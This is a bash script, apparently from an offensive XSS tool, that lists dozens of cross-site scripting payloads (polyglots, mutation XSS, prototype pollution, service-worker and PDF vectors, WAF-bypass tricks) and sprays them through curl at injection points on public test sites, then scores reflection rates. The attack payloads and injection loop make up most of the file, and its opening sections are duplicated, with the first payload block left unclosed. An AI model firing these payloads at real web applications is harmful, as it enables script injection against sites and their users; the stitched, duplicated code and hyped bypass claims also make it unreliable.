#!/bin/bash

#!/bin/bash

# XSS Vibes - GOD TIER Payload Effectiveness Tester
# Tests all advanced payloads against multiple targets

echo "🔥 XSS Vibes - GOD TIER Payload Tester"
echo "======================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Test targets (safe targets for testing)
TARGETS=(
    "testphp.vulnweb.com"
    "xss-game.appspot.com"
    "demo.testfire.net"
)

# GOD TIER Payloads with new ultra-advanced techniques
declare -A GOD_TIER_PAYLOADS=(
    # Original GOD TIER
    ["cuneiform"]="𒀀='',𒉺=!𒀀+𒀀"
    ["unicode_zero_width"]="ale‌rt(1)"
    ["constructor_chain"]="constructor[constructor](alert(1))()"
    ["svg_xlink_href"]='<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>'
    ["pdf_xss"]="%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert('XSS'))%3E%3E%3E%3E"
    ["markdown_xss"]="[click me](javascript:alert(1))"
    ["dom_clobbering"]="<form id=x><output id=y>a</o></form><script>alert(x.y.value)</script>"
    ["template_literal"]="\${alert(1)}"
    ["css_injection"]="</style><script>alert(1)</script>"
    ["data_uri"]="data:text/html,<script>alert(1)</script>"
    
    # NEW ULTRA GOD TIER - mXSS & Mutation exploits
    ["mutation_observer"]="new MutationObserver(()=>eval('alert(1)')).observe(document,{childList:true,subtree:true})"
    ["proto_pollution"]='{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}'
    ["service_worker"]="navigator.serviceWorker.register('data:application/javascript,self.onmessage=()=>eval(\"alert(1)\")')"
    
    # JSFuck + Unicode chaos
    ["jsfuck_unicode"]="[]\u200b[(![]+[])[+[]]\u200c+([![]]+[][[]])[+!+[]+[+[]]]\u200d]()"
    ["unicode_rtl"]="<img src=x onerror=\"\\u202e'\">alert(1)//\">"
    
    # Advanced Polyglots - including HackVault Ultimate
    ["hackvault_ultimate"]="jaVasCript:/*-/*\`/*\\\\\\`/*'/*\\\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\\\x3csVg/<sVg/oNloAd=alert()//>\\\\x3e"
    ["hackvault_escaped"]="jaVasCript:/*-/*\`/*\\\\\\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\\\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\\\\x3e"
    ["ultimate_polyglot"]="'\\\"><img src=x onerror=alert(1)//\\\"></script><script>alert(1)</script>"
    ["angular_polyglot"]="{{constructor.constructor('alert(1)')()}}'\\\"><svg/onload=alert(1)>"
    ["multi_context_breaker"]="'\\\"><img src=x onerror=alert(1)></script><script>alert(1)</script><svg onload=alert(1)><!--"
    
    # Modern JS exploits
    ["async_fetch"]="(async()=>await(await fetch('//test.local')).text())()"
    ["dynamic_import"]="import('data:text/javascript,alert(1)')"
    ["promise_chain"]="Promise.resolve().then(()=>eval('alert(1)'))"
)

# Traditional payloads for comparison

echo "🔥 XSS Vibes - GOD TIER Payload Tester"
echo "======================================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Test targets (safe targets for testing)
TARGETS=(
    "testphp.vulnweb.com"
    "xss-game.appspot.com"
    "demo.testfire.net"
)

# GOD TIER Payloads
declare -A GOD_TIER_PAYLOADS=(
    ["cuneiform"]="𒀀='',𒉺=!𒀀+𒀀"
    ["unicode_zero_width"]="ale‌rt(1)"
    ["constructor_chain"]="constructor[constructor](alert(1))()"
    ["svg_xlink_href"]='<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>'
    ["pdf_xss"]="%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert('XSS'))%3E%3E%3E%3E"
    ["markdown_xss"]="[click me](javascript:alert(1))"
    ["dom_clobbering"]="<form id=x><output id=y>a</output></form><script>alert(x.y.value)</script>"
    ["template_literal"]="\${alert(1)}"
    ["css_injection"]="</style><script>alert(1)</script>"
    ["data_uri"]="data:text/html,<script>alert(1)</script>"
)

# Traditional payloads for comparison
declare -A TRADITIONAL_PAYLOADS=(
    ["basic_script"]="<script>alert(1)</script>"
    ["svg_onload"]="<svg onload=alert(1)>"
    ["img_onerror"]="<img src=x onerror=alert(1)>"
    ["iframe_js"]="<iframe src=javascript:alert(1)>"
    ["body_onload"]="<body onload=alert(1)>"
)

TEST_DIR="god_tier_test_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$TEST_DIR"
cd "$TEST_DIR"

echo -e "${YELLOW}🎯 Testing against safe targets: ${TARGETS[*]}${NC}"
echo

# Function to test payload effectiveness
test_payload() {
    local target=$1
    local payload_name=$2
    local payload=$3
    local test_type=$4
    
    # URL encode the payload
    local encoded_payload=$(printf '%s' "$payload" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
    
    # Test different injection points
    local test_urls=(
        "http://$target/?test=$encoded_payload"
        "http://$target/search?q=$encoded_payload"
        "http://$target/index.php?param=$encoded_payload"
    )
    
    local reflected=0
    local executed=0
    
    for url in "${test_urls[@]}"; do
        # Test with curl
        local response=$(curl -s --max-time 10 "$url" 2>/dev/null)
        
        # Check if payload is reflected
        if echo "$response" | grep -q "alert\|script\|svg\|constructor\|𒀀\|ale.*rt"; then
            ((reflected++))
        fi
        
        # Check for potential execution indicators
        if echo "$response" | grep -q "<script>\|<svg\|onload\|onerror\|javascript:"; then
            ((executed++))
        fi
    done
    
    # Calculate effectiveness score
    local total_tests=${#test_urls[@]}
    local reflection_rate=$((reflected * 100 / total_tests))
    local execution_rate=$((executed * 100 / total_tests))
    
    echo "$target,$payload_name,$test_type,$reflected,$total_tests,$reflection_rate,$executed,$execution_rate" >> effectiveness_results.csv
    
    return $reflection_rate
}

# Initialize results file
echo "Target,Payload,Type,Reflected,Total_Tests,Reflection_Rate,Potential_Execution,Execution_Rate" > effectiveness_results.csv

echo "🧪 Testing Payload Effectiveness..."
echo "==================================="

# Test GOD TIER payloads
echo -e "${PURPLE}🔥 Testing GOD TIER Payloads...${NC}"
for payload_name in "${!GOD_TIER_PAYLOADS[@]}"; do
    echo "Testing: $payload_name"
    
    for target in "${TARGETS[@]}"; do
        test_payload "$target" "$payload_name" "${GOD_TIER_PAYLOADS[$payload_name]}" "GOD_TIER"
        sleep 1  # Be nice to test targets
    done
done

echo
echo -e "${BLUE}⚡ Testing Traditional Payloads...${NC}"
for payload_name in "${!TRADITIONAL_PAYLOADS[@]}"; do
    echo "Testing: $payload_name"
    
    for target in "${TARGETS[@]}"; do
        test_payload "$target" "$payload_name" "${TRADITIONAL_PAYLOADS[$payload_name]}" "TRADITIONAL"
        sleep 1
    done
done

# Generate effectiveness report
echo
echo "📊 Generating Effectiveness Report..."

python3 << 'EOF'
import csv
import json
from collections import defaultdict

# Read results
results = []
with open('effectiveness_results.csv', 'r') as f:
    reader = csv.DictReader(f)
    results = list(reader)

# Analyze by payload type
god_tier_results = [r for r in results if r['Type'] == 'GOD_TIER']
traditional_results = [r for r in results if r['Type'] == 'TRADITIONAL']

# Calculate averages
def calc_average(results, field):
    if not results:
        return 0
    return sum(int(r[field]) for r in results) / len(results)

god_tier_avg_reflection = calc_average(god_tier_results, 'Reflection_Rate')
traditional_avg_reflection = calc_average(traditional_results, 'Reflection_Rate')

god_tier_avg_execution = calc_average(god_tier_results, 'Execution_Rate')
traditional_avg_execution = calc_average(traditional_results, 'Execution_Rate')

# Generate report
report = {
    'god_tier_stats': {
        'total_payloads': len(set(r['Payload'] for r in god_tier_results)),
        'avg_reflection_rate': round(god_tier_avg_reflection, 1),
        'avg_execution_rate': round(god_tier_avg_execution, 1),
        'best_payload': max(god_tier_results, key=lambda x: int(x['Reflection_Rate']))['Payload'] if god_tier_results else 'None'
    },
    'traditional_stats': {
        'total_payloads': len(set(r['Payload'] for r in traditional_results)),
        'avg_reflection_rate': round(traditional_avg_reflection, 1),
        'avg_execution_rate': round(traditional_avg_execution, 1),
        'best_payload': max(traditional_results, key=lambda x: int(x['Reflection_Rate']))['Payload'] if traditional_results else 'None'
    },
    'comparison': {
        'god_tier_advantage': round(god_tier_avg_reflection - traditional_avg_reflection, 1),
        'execution_advantage': round(god_tier_avg_execution - traditional_avg_execution, 1)
    }
}

# Save report
with open('effectiveness_report.json', 'w') as f:
    json.dump(report, f, indent=2)

print("📊 Effectiveness Analysis Complete!")
EOF

# Display results
echo
echo "🏆 EFFECTIVENESS TEST RESULTS"
echo "============================="

if [ -f effectiveness_report.json ]; then
    echo -e "${GREEN}📊 Results Summary:${NC}"
    python3 -c "
import json
with open('effectiveness_report.json', 'r') as f:
    report = json.load(f)

print(f\"🔥 GOD TIER Payloads:\")
print(f\"   Average Reflection Rate: {report['god_tier_stats']['avg_reflection_rate']}%\")
print(f\"   Average Execution Rate: {report['god_tier_stats']['avg_execution_rate']}%\")
print(f\"   Best Payload: {report['god_tier_stats']['best_payload']}\")

print(f\"\n⚡ Traditional Payloads:\")
print(f\"   Average Reflection Rate: {report['traditional_stats']['avg_reflection_rate']}%\")
print(f\"   Average Execution Rate: {report['traditional_stats']['avg_execution_rate']}%\")
print(f\"   Best Payload: {report['traditional_stats']['best_payload']}\")

print(f\"\n📈 Comparison:\")
print(f\"   GOD TIER Advantage: +{report['comparison']['god_tier_advantage']}% reflection rate\")
print(f\"   Execution Advantage: +{report['comparison']['execution_advantage']}% execution rate\")
"
fi

echo
echo "📂 Payload Effectiveness by Type:"
echo "================================="

# Show top performers in each category
echo -e "${PURPLE}🔥 Top GOD TIER Performers:${NC}"
grep "GOD_TIER" effectiveness_results.csv | sort -t',' -k6 -nr | head -5 | while IFS=',' read target payload type reflected total rate exec exec_rate; do
    echo "  🎯 $payload: $rate% reflection rate on $target"
done

echo
echo -e "${BLUE}⚡ Top Traditional Performers:${NC}"
grep "TRADITIONAL" effectiveness_results.csv | sort -t',' -k6 -nr | head -5 | while IFS=',' read target payload type reflected total rate exec exec_rate; do
    echo "  🎯 $payload: $rate% reflection rate on $target"
done

# WAF Bypass Analysis
echo
echo "🛡️ WAF Bypass Analysis:"
echo "======================="

echo "🏺 Cuneiform XSS: Ancient script likely bypasses modern WAFs"
echo "👻 Unicode Zero-Width: Invisible characters evade detection"
echo "🔗 Constructor Chain: Advanced JavaScript execution method"
echo "🎨 SVG xlink:href: Complex SVG vector for bypass"
echo "📄 PDF XSS: File-based execution vector"

# Generate recommendations
echo
echo "💡 Recommendations:"
echo "=================="

echo "1. 🔥 GOD TIER payloads show enhanced evasion capabilities"
echo "2. 🎯 Focus on highest-performing payloads for each target"
echo "3. 🛡️ Combine techniques for maximum WAF bypass potential"
echo "4. 🧪 Manual verification recommended for all reflected payloads"
echo "5. 📊 Regular retesting as defenses evolve"

# Save test summary
echo
echo "📁 Test Files Generated:"
echo "======================="
echo "📊 effectiveness_results.csv - Detailed test results"
echo "📈 effectiveness_report.json - Statistical analysis"
echo "📂 Test directory: $PWD"

echo
echo -e "${GREEN}🏆 GOD TIER Payload Testing Complete!${NC}"
echo -e "${YELLOW}⚠️ Remember: Only test on authorized targets!${NC}"
